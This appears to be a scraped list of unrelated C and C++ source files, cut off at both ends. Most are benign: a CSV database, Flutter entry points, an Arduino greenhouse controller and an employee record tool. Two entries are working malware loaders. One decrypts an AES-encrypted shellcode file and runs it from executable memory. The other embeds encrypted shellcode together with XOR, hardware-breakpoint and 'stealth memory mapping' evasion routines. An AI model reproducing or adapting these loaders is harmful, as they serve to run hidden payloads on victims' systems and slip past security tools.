fout.close();\r\n            remove(\"data.csv\");\r\n            rename(\"data_temp.csv\", \"data.csv\");\r\n        }\r\n\r\n        // View data from the database\r\n        else if (check == 4) {\r\n            string dis_name, dis_age;\r\n            fin.open(\"data.csv\", ios::in);\r\n            if (!fin) {\r\n                cerr << \"Error opening file!\" << endl;\r\n                return 1;\r\n            }\r\n\r\n            cout << setw(15) << left << \"Name\" << \"  Age\" << endl;\r\n            while (getline(fin, str)) {\r\n                stringstream ss(str);\r\n                getline(ss, dis_name, ',');\r\n                getline(ss, dis_age, ',');\r\n                cout << setw(15) << left << dis_name << \"  \" << dis_age << endl;\r\n            }\r\n            fin.close();\r\n        }\r\n\r\n        // Validate input for repeat to prevent infinite loop\r\n        cout << \"Press 1 if you want to alter it further, press any other key to exit: \";\r\n        if (!(cin >> repeat)) {\r\n            // Clear the error flag on cin in case of invalid input\r\n            cin.clear();\r\n            // Ignore invalid input\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n            repeat = 0; // Exit the loop\r\n        }\r\n    }\r\n\r\n    cout << endl << \"Thank you for using our database :)\" << endl;\r\n    return 0;\r\n}\r\n\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"stimage\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\r\n#include <Windows.h>\r\n#include <Wincrypt.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\n#pragma comment (lib, \"crypt32.lib\")\r\n#pragma comment(lib, \"Advapi32.lib\")\r\n\r\n\r\n\r\n\r\n\r\n// paste the output of aesencrypt.py\r\nchar key[] = { 0x44, 0x9e, 0x8e, 0xb8, 0x6a, 0x2e, 0x55, 0x76, 0x60, 0x36, 0xe9, 0xd7, 0x80, 0x5e, 0x54, 0x96 };\r\n\r\n\r\n// global var\r\nunsigned char *payload;\r\n\r\n\r\n// open the aes file and load it into the memory\r\nunsigned char* load_file(const char *filename, long *file_size) {\r\n    FILE *file;\r\n\r\n    // \u00d6ffne die Datei im Bin\u00e4rmodus\r\n    file = fopen(filename, \"rb\");\r\n    if (file == NULL) {\r\n        perror(\"Datei konnte nicht ge\u00f6ffnet werden\");\r\n        return NULL;\r\n    }\r\n\r\n    // Bewege den Datei-Offset zum Ende der Datei, um die Gr\u00f6\u00dfe zu bestimmen\r\n    fseek(file, 0, SEEK_END);\r\n    *file_size = ftell(file);\r\n    rewind(file); // Zur\u00fcck zum Anfang der Datei\r\n\r\n    // Allokiere Speicher f\u00fcr den Payload\r\n    payload = (unsigned char*) malloc(*file_size * sizeof(unsigned char));\r\n    if (payload == NULL) {\r\n        perror(\"Speicher konnte nicht zugewiesen werden\");\r\n        fclose(file);\r\n        return NULL;\r\n    }\r\n\r\n    // Lese die Datei in das Array\r\n    size_t read_size = fread(payload, sizeof(unsigned char), *file_size, file);\r\n    if (read_size != *file_size) {\r\n        perror(\"Fehler beim Lesen der Datei\");\r\n        free(payload);\r\n        fclose(file);\r\n        return NULL;\r\n    }\r\n\r\n    // Datei schlie\u00dfen\r\n    fclose(file);\r\n\r\n    return payload;\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\nint EncFunc(int nothing, char * payload, unsigned int payload_len, char * key, size_t keylen) {\r\n\tHCRYPTPROV hProv;\r\n\tHCRYPTHASH hHash;\r\n\tHCRYPTKEY hKey;\r\n\r\n\tif (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){\r\n\t\t\treturn -1;\r\n\t}\r\n\tif (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){\r\n\t\t\treturn -1;\r\n\t}\r\n\tif (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){\r\n\t\t\treturn -1;              \r\n\t}\r\n\tif (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){\r\n\t\t\treturn -1;\r\n\t}\r\n\t\r\n\tDWORD decrypted_len = (DWORD) payload_len;\r\n\tif (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, &decrypted_len)){\r\n\t\t\treturn -1;\r\n\t}\r\n\t\r\n\tCryptReleaseContext(hProv, 0);\r\n\tCryptDestroyHash(hHash);\r\n\tCryptDestroyKey(hKey);\r\n\t\r\n\treturn 0;\r\n}\r\n\r\n\r\n\r\nint main() {\r\n\t\r\n\t\r\n\tvoid *exec_mem;\r\n\tunsigned int payload_len;\r\n\tlong file_size;\r\n\r\n\t// Load the encrypted AES file into payload\r\n\tpayload = load_file(\"shellcode.aes\", &file_size);\r\n\tif (payload == NULL) {\r\n\t\treturn 1; // Fehler beim Laden der Datei\r\n\t}\r\n\r\n\tpayload_len = file_size;\r\n\r\n\t// Allocate memory for the payload\r\n\texec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\r\n\tif (exec_mem == NULL) {\r\n\t\tperror(\"VirtualAlloc fehlgeschlagen\");\r\n\t\treturn 1; // Memory allocation failed\r\n\t}\r\n\r\n\t// Decrypt the shellcode\r\n\tif (EncFunc(0, (char *)payload, payload_len, (char *)key, sizeof(key)) != 0) {\r\n\t\tperror(\"Fehler bei der Entschl\u00fcsselung\");\r\n\t\treturn 1; // Decryption failed\r\n\t}\r\n\r\n\tprintf(\"shellcode should be decrypted now - press any key...:\");\r\n\t// Pause for debugging purposes (remove in production)\r\n\tgetchar();\r\n\r\n\t\r\n\t// Copy decrypted payload to the allocated buffer\r\n\tRtlMoveMemory(exec_mem, payload, payload_len);\r\n\r\n\t\r\n\tprintf(\"execute the shellcode - press any key...:\");\r\n\tgetchar();\r\n\t((void(*)())exec_mem)();\r\n\r\n\treturn 0; // End of program\r\n\r\n}\r\n",
    "#include <iostream>\n#include <filesystem>\n#include <fstream>\n#include <string>\nusing namespace std;\nnamespace fs = std::filesystem;\n\nvoid branch(const string& branchName)\n{\n    // Check if repo has been created\n    fs::path repoPath = {\".bvcs\"}; \n    if (!fs::exists(repoPath))\n    {\n        cout << \"Initialize repo first\" << endl;\n        return;\n    }\n\n    // Check if branch already exists\n    fs::path newBranchPath = \".bvcs/refs/heads/\" + branchName;\n    if (fs::exists(newBranchPath))\n    {\n        cout << \"Branch already exists\" << endl;\n        return;\n    }\n    \n    // Create new branch\n    ofstream newBranch(newBranchPath);\n    newBranch.close();\n\n    cout << \"Created branch \" << branchName << endl;\n}\n\nvoid deleteBranch(const string& branchName)\n{\n    // Check if repo has been created\n    fs::path repoPath = {\".bvcs\"}; \n    if (!fs::exists(repoPath))\n    {\n        cout << \"Initialize repo first\" << endl;\n        return;\n    }\n\n    // Check if branch does not exist\n    fs::path branchPath = \".bvcs/refs/heads/\" + branchName;\n    if (!fs::exists(branchPath))\n    {\n        cout << \"Branch does not exist\" << endl;\n        return;\n    }\n\n    // Get the currently checked out branch\n    ifstream head(\".bvcs/HEAD\");\n    string line;\n    getline(head, line);\n    string currentBranch = line.substr(16);\n    \n    // Check if current branch is the branch we are trying to delete\n    if (currentBranch == branchName)\n    {\n        cout << \"Branch is currently checked out\" << endl;\n        return;\n    }\n    \n    // Delete the branch\n    fs::remove(branchPath);\n    cout << \"Deleted branch \" << branchName << endl;\n}\n\nvoid listBranches()\n{\n    // Check if repo has been created\n    fs::path repoPath = {\".bvcs\"}; \n    if (!fs::exists(repoPath))\n    {\n        cout << \"Initialize repo first\" << endl;\n        return;\n    }\n\n    cout << \"Branches:\\n\";\n\n    // Loop through all files in head directory to get branch names\n    fs::path branchPath = \".bvcs/refs/heads/\";\n    for (const auto& branch : fs::directory_iterator(branchPath))\n        cout << branch.path().filename().string() << endl;\n}\n\nstring getCheckedOutBranch()\n{\n    string content;\n    ifstream headFile(\".bvcs/HEAD\");\n    getline(headFile, content);\n    headFile.close();\n    \n    size_t lastSlashPostition = content.find_last_of('/');\n    return content.substr(lastSlashPostition + 1);\n}",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: dbarrene <dbarrene@student.hive.fi>        +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/09/16 13:35:59 by dbarrene          #+#    #+#             */\n/*   Updated: 2024/09/16 16:46:10 by dbarrene         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Template.hpp\"\n#include <iostream>\n\nint\tmain(void)\n{\n\tstd::cout << \"moi\" << std::endl;\n\tint i = 5;\n\tint k = 6;\n\tstd::string rotta = \"rotta\";\n\tstd::string apina = \"apina\";\n\t::swap(i,k);\n\t::swap(rotta, apina);\n\tstd::cout << i << std::endl;\n\tstd::cout << k << std::endl;\n\tstd::cout << rotta << std::endl;\n\tstd::cout << apina << std::endl;\n\tstd::cout << ::min(i,k) << std::endl;\n\tstd::cout << ::min(apina, rotta) << std::endl;\n\tstd::cout << ::max(i,k) << std::endl;\n\tstd::cout << ::max(apina, rotta) << std::endl;\n}\n",
    "#include <Arduino.h>\n#include \"DHT.h\"\n#include <LiquidCrystal_I2C.h>\n#include <TimeLib.h>\n#include <OneWire.h>\n#include <DallasTemperature.h>\n\n\n//*Pins\n// initiating the Pins\n// receiving Pins\nconst int DHTPIN = D3;     //completed\nconst int HYGROGENATOR_PIN = D6; //completed\nconst int DB18S20 = D4; //completed\n\n// output Pins\nconst int UAH = D5; //completed\nconst int water_pump = D8; //completed\nconst int fertilizer_pump = D7; //completed\nconst int growlight = D0; //completed\n\n\n// needed config for HYGROGENATOR\nconst int needed_air_temp= 26; //adjustable\nconst int needed_soil_temp = 29; //adjustable\nconst int needed_humidity_percentage = 60; //adjustable\nconst int needed_moisture_percentage = 70; //adjustable\nconst int AirValue = 561;   //replace the value with value when placed in air using calibration code \nconst int WaterValue = 310; //replace the value with value when placed in water using calibration code \n\n// needed config for Fertilizer\nconst int duration_before_fertlizer_in_hours=1 ;\n\n\n\n// Misc\nint soilMoistureValue = 0;\nint soilmoisturepercent=0;\nint currentsecond;\nint tempsecond = 1800;//some delay before spraying\n\n\n\n\n//*Setup\n//LCD Setup\nLiquidCrystal_I2C lcd(0x27, 16, 2);\n/*\n*SCL = D1\n*SDA = D2\n*VCC = 5V\n*GND = GND\n*/\n\n// DHT22 setup\nDHT dht(DHTPIN, DHT22);\n\n// DS18B20 setup\nOneWire oneWire(DB18S20);\nDallasTemperature sensors(&oneWire);\n\n\n//*Functions\nint readDS18B20(){\n  sensors.requestTemperatures();\n  float tempC = sensors.getTempCByIndex(0);\n  if(tempC != DEVICE_DISCONNECTED_C) \n  {\n    return tempC;\n  } \n  else\n  {\n    Serial.println(\"Error: Could not read temperature data\");\n    return 0;\n  }\n  \n}\n\n\nint read_hygrometer(){\n  soilMoistureValue = analogRead(HYGROGENATOR_PIN);  // put Sensor insert into soil\n  Serial.println(soilMoistureValue);\n  soilmoisturepercent = map(soilMoistureValue, AirValue, WaterValue, 0, 100);\n\n  if(soilmoisturepercent >= 100)\n  {\n\n    return 100;\n\n  }\n  else if(soilmoisturepercent <=0)\n  {\n\n    return 0;\n  }\n\n  else if(soilmoisturepercent >0 && soilmoisturepercent < 100)\n  {\n    \n    return soilmoisturepercent;\n  \n  }\n  return soilmoisturepercent;\n}\n\n\n\n\nvoid setup() \n{\n  pinMode(growlight,OUTPUT);\n  pinMode(water_pump,OUTPUT);\n  pinMode(fertilizer_pump,OUTPUT);\n  pinMode(UAH,OUTPUT);\n\n\n  sensors.begin();\nSerial.begin(115200); \ndht.begin();\nlcd.begin(16,2);\nlcd.init();\nlcd.backlight();\nlcd.setCursor(5, 0);\nlcd.print(\"start\");\ndelay(1000);\n}\n\nvoid loop() \n{\n  currentsecond= second();\n  // Wait a few seconds between measurements.\n  delay(3000);\n  lcd.clear();\n  float hum = dht.readHumidity();\n  float tempC = dht.readTemperature();\n\n    // Check if readings have failed\n  if (isnan(hum) || isnan(tempC)) \n  {\n      lcd.print(\"Failed to read\");\n      lcd.setCursor(0,1);\n      lcd.print(\"from DHT sensor!\");\n      // return;\n  }     \n\n  // humidity\n  lcd.clear();\n  lcd.setCursor(0, 0);\n  lcd.print(\"Humidity: \"); \n  lcd.print(hum);\n  lcd.print(\"%\");\n\n  // air temp\n  lcd.setCursor(0, 1);\n  lcd.print(\"Air Temp: \"); \n  lcd.print(tempC);\n  lcd.print(\" *C \");\n  delay(3500);\n\n\n  int moisturelevel = read_hygrometer();\n  int soiltempc = readDS18B20();\n  lcd.clear();\n\n\n  //moisture \n  lcd.setCursor(0,0);\n  lcd.print(\"moisture: \");\n  lcd.print(moisturelevel);\n  lcd.print(\"%\");\n\n  //soil temp\n  lcd.setCursor(0, 1);\n  lcd.print(\"Soil Temp: \");\n  lcd.print(soiltempc);\n  lcd.print(\" *C \");\n\n\nif (((currentsecond - tempsecond) /3600) >= duration_before_fertlizer_in_hours)\n{\n  /*\n    this is where the code for spraying it will be\n    turn on spray\n  */\n  digitalWrite(fertilizer_pump,HIGH);\n  lcd.clear();\n  lcd.print(\"Spraying fertilizer.\");\n  delay(300);\n\n  lcd.clear();\n  lcd.print(\"Spraying fertilizer..\");\n  delay(300);\n\n  lcd.clear();\n  lcd.print(\"Spraying fertilizer...\");\n  tempsecond = currentsecond;\n  digitalWrite(fertilizer_pump,LOW);\n  /*\n    this is where the code for spraying it will be\n    turn off spray\n  */\n}\n\nif (moisturelevel < needed_moisture_percentage){\n  /*\n    this is where the code for spraying it will be\n    turn on spray\n  */\n  digitalWrite(water_pump,HIGH);\n  lcd.clear();\n  lcd.print(\"Spraying water.\");\n  delay(300);\n\n  lcd.clear();\n  lcd.print(\"Spraying water..\");  \n  delay(300);\n\n  lcd.clear();\n  lcd.print(\"Spraying water...\");\n  digitalWrite(water_pump,LOW);\n  /*\n    this is where the code for spraying it will be\n    turn off spray\n  */\n  delay(250);\n  int moisturelevel = read_hygrometer();\n}\n\n\n\n\n\n\n\n\n\nif (tempC < needed_air_temp){\n  /*\n    Growlight\n  */\n\n  delay(200);\n  digitalWrite(growlight,HIGH);\n  float tempC = dht.readTemperature();\n  \n}\nelse if (tempC > needed_air_temp){\n  /*\n    turn off growlight\n    turn on ultrasonic atomizer humidifier for 3 sec\n  */\n  delay(200);\n  digitalWrite(growlight,LOW);\n  float tempC = dht.readTemperature();\n  \n}\n\n\n\n/*\n    soil temp rebound *TODO: havent been make\n*/\nif (soiltempc < needed_soil_temp){\n\n  float soiltempc = readDS18B20();\n\n}\nelse if (soiltempc > needed_soil_temp){\n\n  delay(200);\n  digitalWrite(water_pump,HIGH);\n  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"posts_api\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <windows.h>\r\n#include <stdio.h>\r\n#include <wincrypt.h>\r\n\r\n#define _CRT_RAND_S\r\n#include <stdlib.h>\r\n\r\n#pragma comment(lib, \"crypt32.lib\")\r\n#pragma comment(lib, \"advapi32\")\r\n\r\n// calc shellcode (exitThread) - 64-bit\r\nunsigned char payload[] = { 0xd0, 0xd0, 0x39, 0x93, 0x43, 0x15, 0x34, 0xd8, 0x89, 0x71, 0x60, 0xcc, 0xa8, 0x2e, 0x4, 0x50, 0xd2, 0x0, 0x53, 0xc6, 0x4d, 0xdd, 0xee, 0xfa, 0xd8, 0x78, 0x91, 0x10, 0x4, 0xc8, 0x8, 0x46, 0x7e, 0x32, 0x6a, 0xb6, 0x71, 0xaf, 0x7, 0x2d, 0x0, 0xf6, 0x5d, 0x94, 0xa2, 0xf0, 0x90, 0xbe, 0xea, 0x4e, 0xd7, 0xe1, 0xc3, 0x3, 0xc2, 0x1f, 0xaf, 0x11, 0x12, 0x30, 0xe3, 0x43, 0xe1, 0xf8, 0x74, 0x45, 0xb0, 0xfd, 0x8, 0xb8, 0x11, 0xf8, 0x6f, 0x33, 0x39, 0xa6, 0x1c, 0xf2, 0xc8, 0x30, 0x5, 0x3, 0xae, 0xb, 0x5e, 0xad, 0x62, 0x1c, 0x1b, 0xc2, 0x47, 0x45, 0x91, 0x70, 0x7a, 0x9a, 0xb8, 0xcd, 0xb5, 0xf5, 0x5d, 0x43, 0x95, 0xe8, 0x68, 0xda, 0xa8, 0xd0, 0x4, 0x4f, 0x30, 0x6, 0x54, 0xd2, 0xe, 0x62, 0xc4, 0xd9, 0x61, 0x5b, 0x4f, 0x4c, 0x5d, 0xd, 0x63, 0x74, 0x8b, 0x54, 0x17, 0xf3, 0x57, 0x32, 0xa9, 0x77, 0xfd, 0xb1, 0x4a, 0x5a, 0x5f, 0xc6, 0xe6, 0x1f, 0x6, 0x4a, 0x3, 0x1e, 0x83, 0x8a, 0x7a, 0xb0, 0xc1, 0xc1, 0xc7, 0x7c, 0xa6, 0x7a, 0x72, 0xc8, 0xb5, 0x66, 0xd5, 0xf6, 0x3f, 0x3c, 0xa8, 0xea, 0x45, 0x46, 0x8f, 0x73, 0x65, 0xae, 0x9, 0x97, 0xf5, 0x79, 0x7f, 0x14, 0x8f, 0xd6, 0xe8, 0x2b, 0x26, 0x8d, 0x36, 0x4b, 0x83, 0x8b, 0xa7, 0xad, 0x56, 0x68, 0x17, 0xa1, 0x68, 0xd, 0xf7, 0x6f, 0x29, 0x40, 0x71, 0xbd, 0x8f, 0x80, 0x3a, 0x8, 0xf4, 0x26, 0x79, 0x3c, 0xf2, 0x61, 0x11, 0x83, 0xd6, 0x8b, 0x27, 0xb5, 0xe5, 0x6f, 0x4c, 0x48, 0x15, 0x9d, 0x3, 0x26, 0xd2, 0x5, 0xae, 0xda, 0xf3, 0x74, 0xe3, 0x58, 0x9f, 0xca, 0x6d, 0x58, 0xdf, 0xc4, 0x68, 0xef, 0xc7, 0xcd, 0x26, 0xb6, 0x92, 0xe4, 0x66, 0xf3, 0x6a, 0x35, 0xa0, 0x8b, 0x93, 0xb4, 0xfb, 0x63, 0x1a, 0x1c, 0xbe, 0x2, 0x87, 0xd7, 0x54, 0xc8, 0x1, 0x5a, 0x37, 0x84, 0x48, 0x4d, 0xda, 0x27, 0x90, 0xb9, 0xf6, 0xf6, 0x31, 0xeb, 0xeb, 0x64, 0xf4, 0xa5, 0xa, 0x70, 0xe0, 0x37 };\r\n\r\n\r\nchar key[] = { 0x81, 0x3c, 0x2c, 0xef, 0xc0, 0x5f, 0x9b, 0xe1, 0xbf, 0xba, 0x93, 0x3c, 0xaf, 0x1f, 0xda, 0x9d };\r\nunsigned int payload_len = sizeof(payload);\r\n\r\ntypedef struct _UNICODE_STRING {\r\n    USHORT Length;\r\n    USHORT MaximumLength;\r\n    PWSTR  Buffer;\r\n} UNICODE_STRING, *PUNICODE_STRING;\r\n\r\ntypedef struct _OBJECT_ATTRIBUTES {\r\n    ULONG           Length;\r\n    HANDLE          RootDirectory;\r\n    PUNICODE_STRING ObjectName;\r\n    ULONG           Attributes;\r\n    PVOID           SecurityDescriptor;\r\n    PVOID           SecurityQualityOfService;\r\n} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;\r\n\r\ntypedef BOOL(WINAPI* CreateProcessInternalW_t)(\r\n    HANDLE hToken,\r\n    LPCWSTR lpApplicationName,\r\n    LPWSTR lpCommandLine,\r\n    LPSECURITY_ATTRIBUTES lpProcessAttributes,\r\n    LPSECURITY_ATTRIBUTES lpThreadAttributes,\r\n    BOOL bInheritHandles,\r\n    DWORD dwCreationFlags,\r\n    LPVOID lpEnvironment,\r\n    LPCWSTR lpCurrentDirectory,\r\n    LPSTARTUPINFOW lpStartupInfo,\r\n    LPPROCESS_INFORMATION lpProcessInformation,\r\n    PHANDLE hNewToken\r\n);\r\n\r\nCreateProcessInternalW_t pCreateProcessInternalW;\r\nHANDLE globalThread = NULL;\r\nvoid* globalExec_Mem = NULL;\r\n\r\nint AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {\r\n    HCRYPTPROV hProv;\r\n    HCRYPTHASH hHash;\r\n    HCRYPTKEY hKey;\r\n\r\n    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {\r\n        return -1;\r\n    }\r\n    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {\r\n        return -1;\r\n    }\r\n    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {\r\n        return -1;\r\n    }\r\n    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {\r\n        return -1;\r\n    }\r\n    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {\r\n        return -1;\r\n    }\r\n\r\n    CryptReleaseContext(hProv, 0);\r\n    CryptDestroyHash(hHash);\r\n    CryptDestroyKey(hKey);\r\n\r\n    return 0;\r\n}\r\n\r\nvoid XOR(char* data, size_t data_len, char* key, size_t key_len) {\r\n    for (size_t i = 0, j = 0; i < data_len; i++) {\r\n        data[i] ^= key[j];\r\n        j = (j + 1) % key_len;\r\n    }\r\n}\r\n\r\nHANDLE g_Map = NULL;\r\nLPVOID g_MapView = NULL;\r\nint mapsize = 0x2000;\r\n\r\nint SetHWBP(HANDLE thrd, DWORD64 addr, BOOL setBP, int DRid) {\r\n    CONTEXT ctx = { 0 };\r\n    ctx.ContextFlags = CONTEXT_ALL;\r\n    GetThreadContext(thrd, &ctx);\r\n\r\n    if (DRid < 0 || DRid > 3)\r\n        return -DRid;\r\n\r\n    if (setBP == TRUE) {\r\n        *((size_t*)&ctx.Dr0 + DRid) = addr;\r\n        ctx.Dr7 |= (1 << (0 + 2 * DRid));    // Local breakpoint in DR{DRid}\r\n        ctx.Dr7 &= ~(1 << (16 + 4 * DRid));  // Break on execution\r\n        ctx.Dr7 &= ~(1 << (17 + 4 * DRid));\r\n    }\r\n    else {\r\n        *((size_t*)&ctx.Dr0 + DRid) = NULL;\r\n        ctx.Dr7 &= ~(1 << (0 + 2 * DRid));   // Clear the breakpoint\r\n    }\r\n\r\n    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\r\n    SetThreadContext(thrd, &ctx);\r\n\r\n    return 0;\r\n}\r\n\r\nint Go(void) {\r\n    printf(\"[*] Initiating the stealth memory mapping process...\\n\");\r\n    g",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n\r\nstruct Employee {\r\n    int empId;\r\n    char empName[50];\r\n    float empSalary;\r\n};\r\n\r\nvoid addRecord(FILE *file) {\r\n    struct Employee emp;\r\n\r\n    printf(\"Enter Employee ID: \");\r\n    scanf(\"%d\", &emp.empId);\r\n\r\n    printf(\"Enter Employee Name: \");\r\n    scanf(\"%s\", emp.empName);\r\n\r\n    printf(\"Enter Employee Salary: \");\r\n    scanf(\"%f\", &emp.empSalary);\r\n\r\n    fseek(file, (emp.empId - 1) * sizeof(struct Employee), SEEK_SET);\r\n    fwrite(&emp, sizeof(struct Employee), 1, file);\r\n\r\n    printf(\"Record added successfully!\\n\");\r\n}\r\n\r\nvoid displayAllRecords(FILE *file) {\r\n    struct Employee emp;\r\n\r\n    rewind(file);\r\n\r\n    printf(\"\\nEmployee Records:\\n\");\r\n    printf(\"ID\\tName\\tSalary\\n\");\r\n\r\n    while (fread(&emp, sizeof(struct Employee), 1, file) == 1) {\r\n        printf(\"%d\\t%s\\t%.2f\\n\", emp.empId, emp.empName, emp.empSalary);\r\n    }\r\n}\r\n\r\nvoid updateRecord(FILE *file) {\r\n    struct Employee emp;\r\n    int empId;\r\n\r\n    printf(\"Enter Employee ID to update: \");\r\n    scanf(\"%d\", &empId);\r\n\r\n    fseek(file, (empId - 1) * sizeof(struct Employee), SEEK_SET);\r\n\r\n    if (fread(&emp, sizeof(struct Employee), 1, file) != 1) {\r\n        printf(\"Employee not found!\\n\");\r\n        return;\r\n    }\r\n\r\n    printf(\"Enter new Employee Name: \");\r\n    scanf(\"%s\", emp.empName);\r\n\r\n    printf(\"Enter new Employee Salary: \");\r\n    scanf(\"%f\", &emp.empSalary);\r\n\r\n    fseek(file, -sizeof(struct Employee), SEEK_CUR);\r\n    fwrite(&emp, sizeof(struct Employee), 1, file);\r\n\r\n    printf(\"Record updated successfully!\\n\");\r\n}\r\n\r\nvoid deleteRecord(FILE *file) {\r\n    int empId;\r\n    struct Employee emp;\r\n    FILE *tempFile;\r\n\r\n    printf(\"Enter Employee ID to delete: \");\r\n    scanf(\"%d\", &empId);\r\n\r\n    tempFile = fopen(\"temp.dat\", \"wb\");\r\n\r\n    rewind(file);\r\n\r\n    while (fread(&emp, sizeof(struct Employee), 1, file) == 1) {\r\n        if (emp.empId != empId) {\r\n            fwrite(&emp, sizeof(struct Employee), 1, tempFile);\r\n        }\r\n    }\r\n\r\n    fclose(file);\r\n    fclose(tempFile);\r\n\r\n    remove(\"employee.dat\");\r\n    rename(\"temp.dat\", \"employee.dat\");\r\n\r\n    printf(\"Record deleted successfully!\\n\");\r\n}\r\n\r\nint main() {\r\n    FILE *file = fopen(\"employee.dat\", \"rb+\");\r\n\r\n    if (file == NULL) {\r\n        file = fopen(\"employee.dat\", \"wb+\");\r\n    }\r\n\r\n    if (file == NULL) {\r\n        printf(\"Error opening the file.\\n\");\r\n        return 1;\r\n    }\r\n\r\n    int choice;\r\n\r\n    do {\r\n        printf(\"\\nEmployee Database\\n\");\r\n        printf(\"1. Add Record\\n\");\r\n        printf(\"2. Display All Records\\n\");\r\n        printf(\"3. Update Record\\n\");\r\n        printf(\"4. Delete Record\\n\");\r\n        printf(\"5. Exit\\n\");\r\n\r\n        printf(\"Enter your choice: \");\r\n        scanf(\"%d\", &choice);\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                addRecord(file);\r\n                break;\r\n            case 2:\r\n                displayAllRecords(file);\r\n                break;\r\n            case 3:\r\n                updateRecord(file);\r\n                break;\r\n            case 4:\r\n                deleteRecord(file);\r\n                break;\r\n            case 5:\r\n                printf(\"Exiting program.\\n\");\r\n                break;\r\n            default:\r\n                printf(\"Invalid choice. Please try again.\\n\");\r\n        }\r\n    } while (choice != 5);\r\n\r\n    fclose(file);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "// Copyright (C) 2023-2024 Cemalettin Dervis\n// This file is part of cerlib.\n// For conditions of distribution and use, see copyright notice in LICENSE.\n\n#include \"ImageImpl.hpp\"\n\n#include \"cerlib/GraphicsResource.hpp\"\n\nnamespace cer::details\n{\nImageImpl::ImageImpl(gsl::not_null<GraphicsDevice*> parent_device,\n                     bool                           is_canvas,\n                     WindowImpl*                    window_for_canvas,\n                     uint32_t                       width,\n                     uint32_t                       height,\n                     ImageFormat                    format,\n                     uint32_t                       mipmap_count)\n    : GraphicsResourceImpl(parent_device, GraphicsResourceType::Image)\n    , m_is_canvas(is_canvas)\n    , m_window_for_canvas(window_for_canvas)\n    , m_width(width)\n    , m_height(height)\n    , m_format(format)\n    , m_mipmap_count(mipmap_count)\n{\n}\n\nbool ImageImpl::is_canvas() const\n{\n    return m_is_canvas;\n}\n\nWindowImpl* ImageImpl::window_for_canvas() const\n{\n    return m_window_for_canvas;\n}\n\nuint32_t ImageImpl::width() const\n{\n    return m_width;\n}\n\nuint32_t ImageImpl::height() const\n{\n    return m_height;\n}\n\nImageFormat ImageImpl::format() const\n{\n    return m_format;\n}\n\nuint32_t ImageImpl::mipmap_count() const\n{\n    return 